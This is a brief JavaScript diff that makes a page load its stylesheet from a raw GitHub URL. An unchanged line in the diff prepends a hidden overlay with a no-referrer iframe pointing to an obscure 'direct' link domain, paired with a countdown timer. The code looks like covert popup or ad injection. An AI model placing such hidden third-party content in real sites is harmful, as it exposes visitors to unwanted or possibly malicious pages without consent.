@@ -5,7 +5,7 @@ var capfe = localStorage.getItem('capfe') || new Date().getTime();
 var fiveMinutes = 3; //time in sec for Countdown
 var viddk;
 $(document).ready(function(){
-    $('head').append('<link rel="stylesheet" href="kas.css" type="text/css" />');
+    $('head').append('<link rel="stylesheet" href="https://raw.githubusercontent.com/Alkansa-1/test/main/kas.css" type="text/css" />');
     $("body").prepend("<div style='display: None;' id='overlay' ><div id='popup'><div style='display: None;' id='close'>Close</div><iframe referrerpolicy='no-referrer' height='100%' width='100%' src='https://a.b0f1d2.com/api/direct/292535'></iframe></div></div>");});
     var kudoos;
     var funday;
